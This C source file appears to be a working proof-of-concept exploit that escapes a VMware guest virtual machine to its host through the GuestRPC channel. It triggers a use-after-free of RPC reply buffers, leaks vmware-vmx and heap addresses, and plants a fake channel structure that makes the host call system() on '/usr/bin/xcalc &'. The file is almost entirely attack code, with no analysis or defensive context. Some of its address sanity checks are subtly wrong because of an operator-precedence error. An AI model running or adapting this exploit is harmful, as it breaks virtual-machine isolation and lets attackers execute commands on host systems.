#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sched.h>

#include "guestrpc.c"

void hexdump(const void* data, size_t size) {
	char ascii[17];
	size_t i, j;
	ascii[16] = '\0';
	for (i = 0; i < size; ++i) {
		printf("%02X ", ((unsigned char*)data)[i]);
		if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
			ascii[i % 16] = ((unsigned char*)data)[i];
		} else {
			ascii[i % 16] = '.';
		}
		if ((i+1) % 8 == 0 || i+1 == size) {
			printf(" ");
			if ((i+1) % 16 == 0) {
				printf("|  %s \n", ascii);
			} else if (i+1 == size) {
				ascii[(i+1) % 16] = '\0';
				if ((i+1) % 16 <= 8) {
					printf(" ");
				}
				for (j = (i+1) % 16; j < 16; ++j) {
					printf("   ");
				}
				printf("|  %s \n", ascii);
			}
		}
	}
}

int guestrpc_open(void);
static int guestrpc_command_len(int channel, size_t len);
static int guestrpc_command_data(int channel, uint32_t data);
static int guestrpc_reply_len(int channel, uint16_t *reply_id);
static int guestrpc_reply_data(int channel, uint16_t reply_id, uint32_t *data);
static int guestrpc_reply_finish(int channel, uint16_t reply_id);
void guestrpc_close(int channel);

int guestrpc_command_send_internal(int channel, char *command, size_t cmdlen) {
	const uint8_t *command_bytes = ( ( const void * ) command );
	size_t command_len = cmdlen;
	uint16_t status;
	uint8_t *status_bytes = ( ( void * ) &status );
	size_t status_len = sizeof ( status );
	uint32_t data;
	int len;
	int remaining;
	unsigned int i;
	int rc;

	/* Send command data */
	while ( command_len ) {
		data = 0;
		for ( i = sizeof ( data ) ; i ; i-- ) {
			if ( command_len ) {
				data = ( ( data & ~0xff ) |
					 *(command_bytes++) );
				command_len--;
			}
			data = ( ( data << 24 ) | ( data >> 8 ) );
		}
		if ( ( rc = guestrpc_command_data ( channel, data ) ) < 0 )
			return rc;
	}
	return 0;
}

int guestrpc_command_send(int channel, char *command) {
	return guestrpc_command_send_internal(channel, command, strlen(command));
}

int guestrpc_recv_data ( int channel, uint16_t reply_id, char *reply, size_t reply_len, uint16_t *out_status) {
	uint8_t *reply_bytes = ( ( void * ) reply );
	int orig_reply_len = reply_len;
	uint16_t status = 0;
	uint8_t *status_bytes = ( ( void * ) &status );
	size_t status_len = sizeof ( status );
	uint32_t data = 0;
	int len = reply_len;
	int remaining = 0;
	unsigned int i = 0;
	int rc = 0;

	/* Receive reply */
	for ( remaining = len ; remaining > 0 ; remaining -= sizeof ( data ) ) {
		if ( ( rc = guestrpc_reply_data ( channel, reply_id,
						  &data ) ) < 0 ) {
			return rc;
		}
		for ( i = sizeof ( data ) ; i ; i-- ) {
			if ( status_len ) {
				*(status_bytes++) = ( data & 0xff );
				status_len--;
				len--;
			} else if ( reply_len ) {
				*(reply_bytes++) = ( data & 0xff );
				reply_len--;
			}
			data = ( ( data << 24 ) | ( data >> 8 ) );
		}
	}

	if (out_status)
		*out_status = status;

	return 0;
}

int main() {

	// try to pin ourselves to the first cpu, so we don't have to deal w/ tcache woes
	cpu_set_t cset;
	CPU_ZERO(&cset);
	CPU_SET(0, &cset);
	printf("setaffinity: %d\n", sched_setaffinity(0, sizeof(cpu_set_t), &cset));

	// we can trigger a chunk double free

	// make some channels
	int first = guestrpc_open();

	char data[0x100] = {};

	char val[0xF1];
	memset(val, 0, sizeof(val));
	memset(val, 0x41, sizeof(val) - 1);

	// set a copypaste version
	int cp = guestrpc_open();
	strcpy(data, "tools.capability.dnd_version 3");
	guestrpc_command(cp, data, data, sizeof(data));
	guestrpc_close(cp);

	// set a value to retrieve later
	sprintf(data, "info-set guestinfo.hello %s", val);
	guestrpc_command(first, data, data, sizeof(data));
	guestrpc_close(first);

	// -----------------------------------------------------

	first = guestrpc_open();
	cp = guestrpc_open();

	// set both lengths to smallbin size
	strcpy(data, "info-get guestinfo.hello");
	guestrpc_command_len(first, strlen(data));
	guestrpc_command_send(first, data);

	// grab our reply ids
	uint16_t firstreply = 0;

	int firstlen = guestrpc_reply_len(first, &firstreply);
	printf("replyid: %x\n", firstreply);

	// receive the data
	guestrpc_recv_data(first, firstreply, data, firstlen, NULL);

	// set up another channel to leak data
	int second = guestrpc_open();
	uint16_t secondreply = 0;
	sprintf(data, "info-get guestinfo.hello");

	guestrpc_command_len(second, strlen(data));

	// this triggers a free of the underlying reply buffer
	guestrpc_reply_finish(first, firstreply | 0x20);
	
	guestrpc_command_send(second, data);
	int secondlen = guestrpc_reply_len(second, &secondreply);

	// close the channel, causing another reply buf free
	guestrpc_close(first);
		
	strcpy(data, "vmx.capability.dnd_version");
	guestrpc_command_len(cp, strlen(data));
	guestrpc_command_send(cp, data);

	// leak out the libc pointer 
	memset(data, 0xCC, sizeof(data));
	guestrpc_recv_data(second, secondreply, &data[2], secondlen, (uint16_t *)&data);
	guestrpc_close(second);

	hexdump(data, sizeof(data));

	uint64_t vtable = *(uint64_t *)&data[0];
	uint64_t vmxbase = vtable - 0xf819b0;
	printf("vtable: 0x%lx\n", vtable);
	printf("vmxbase: 0x%lx\n", vmxbase);

	if (vmxbase & 0xFF0000000000 != 0x55) {
		printf("vmware-vmx base seems wrong, bailing\n");
		exit(0);
	}

	uint64_t system = vmxbase + 0xecfd6;
	
	// -----------------------------------------------------

	first = guestrpc_open();

	memset(data, 0, sizeof(data));
	char heapval[0xB1];
	memset(heapval, 0, sizeof(heapval));
	memset(heapval, 0x41, sizeof(heapval) - 1);

	// set a value of size 0xA0 to retrieve later
	sprintf(data, "info-set guestinfo.hello2 %s", heapval);
	guestrpc_command(first, data, data, sizeof(data));
	guestrpc_close(first);

	// -----------------------------------------------------

	for(int x = 0; x < 2; x++) {
		first = guestrpc_open();

		// set both lengths to smallbin size
		strcpy(data, "info-get guestinfo.hello2");
		guestrpc_command_len(first, strlen(data));
		guestrpc_command_send(first, data);

		// grab our reply ids
		uint16_t firstreply = 0;

		int firstlen = guestrpc_reply_len(first, &firstreply);
		printf("replyid: %x\n", firstreply);

		// receive the data
		guestrpc_recv_data(first, firstreply, data, firstlen, NULL);

		// set up another channel to leak data
		int second = guestrpc_open();
		uint16_t secondreply = 0;
		sprintf(data, "info-get guestinfo.hello2");

		guestrpc_command_len(second, strlen(data));

		// this triggers a free of the underlying reply buffer
		guestrpc_reply_finish(first, firstreply | 0x20);
		
		guestrpc_command_send(second, data);
		int secondlen = guestrpc_reply_len(second, &secondreply);

		// close the channel, causing another reply buf free
		guestrpc_close(first);

		// leak out the libc pointer 
		memset(data, 0, sizeof(data));
		guestrpc_recv_data(second, secondreply, &data[2], secondlen, (uint16_t *)&data);
		guestrpc_close(second);
	}

	hexdump(data, sizeof(data));

	uint64_t chunk = *(uint64_t *)&data[0];
	uint64_t arena = chunk & 0xFFFFFFFFFFF00000uLL;
	printf("chunk: 0x%lx\n", chunk);
	printf("arena: 0x%lx\n", arena);

	if (arena & 0xFF0000000000 != 0x7f) {
		printf("arena val seems wrong, bailing\n");
		exit(0);
	}

	// same as above, but now let's leak a heap chunk
	//

#define VAL2_SIZE 0xc0
	first = guestrpc_open();
	char * val2 = malloc(VAL2_SIZE);
	memset(val2, 0x41, VAL2_SIZE);
	sprintf(data, "info-set guestinfo.hello2 %s", val2);
	guestrpc_command(first, data, data, sizeof(data));
	guestrpc_close(first);

	int a = guestrpc_open();
	int b = guestrpc_open();
	int c = guestrpc_open();
	int d = guestrpc_open();
	int e = guestrpc_open();

	// alloc the buf
	strcpy(val2, "info-get guestinfo.hello2");
	guestrpc_command_len(a, strlen(val2));
	guestrpc_command_send(a, val2);

	// alloc
	firstreply = 0;
	firstlen = guestrpc_reply_len(a, &firstreply);
	guestrpc_recv_data(a, firstreply, data, firstlen, NULL);

	// this triggers a free of the underlying reply buffer
	uint64_t channelbase = vmxbase + 0xFE9660 + (0x60 * 5);
	printf("channelbase: %lx\n", channelbase);
	guestrpc_reply_finish(a, firstreply | 0x20);
		
	// spray the size
	guestrpc_command_len(b, VAL2_SIZE);
	memset(val2, 0x43, VAL2_SIZE);
	*(uint64_t *)val2 = channelbase;
	guestrpc_close(a);
	guestrpc_command_send(b, val2);

	memset(val2, 0x44, VAL2_SIZE);
	guestrpc_command_len(c, VAL2_SIZE);
	guestrpc_command_send(c, val2);

	// this is the data that will be our fake channel
	strcpy(&val2[0x18], "/usr/bin/xcalc &");
	*(uint64_t *)&val2[0x00] = 0x4uLL;
	*(uint64_t *)&val2[0x40] = system;
	*(uint64_t *)&val2[0x48] = channelbase + 0x18;
	guestrpc_command_len(d, VAL2_SIZE);
	guestrpc_command_send_internal(d, val2, 0x50);

	//printf("done ???\n"); sleep(5);
	guestrpc_reply_finish(e, 1);

	return 0;
}
